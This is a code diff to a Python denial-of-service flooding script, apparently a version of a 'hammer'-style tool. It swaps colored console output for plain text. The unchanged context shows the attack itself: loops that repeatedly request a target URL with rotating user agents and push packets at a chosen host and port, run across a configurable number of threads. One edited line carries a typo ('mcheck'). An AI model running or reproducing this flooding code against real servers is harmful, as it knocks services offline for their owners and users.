@@ -27,7 +27,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("bot is hammering...", end='\r')
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -41,14 +41,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print (time.ctime(time.time()),"<--packet sent! hammering-->", end='\r')
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				print("shut down", end='\r')
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
-		#print("\033[91m",e,"\033[0m")
+		print("no connection! server maybe down", end='\r')
 		time.sleep(.1)
 
 
@@ -119,8 +118,8 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print(host," port: ",str(port)," turbo: ",str(thr))
+	print("Please wait...")
 	user_agent()
 	my_bots()
 	time.sleep(5)
@@ -129,7 +128,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("mcheck server ip and port")
 		usage()
 	while True:
 		for i in range(int(thr)):
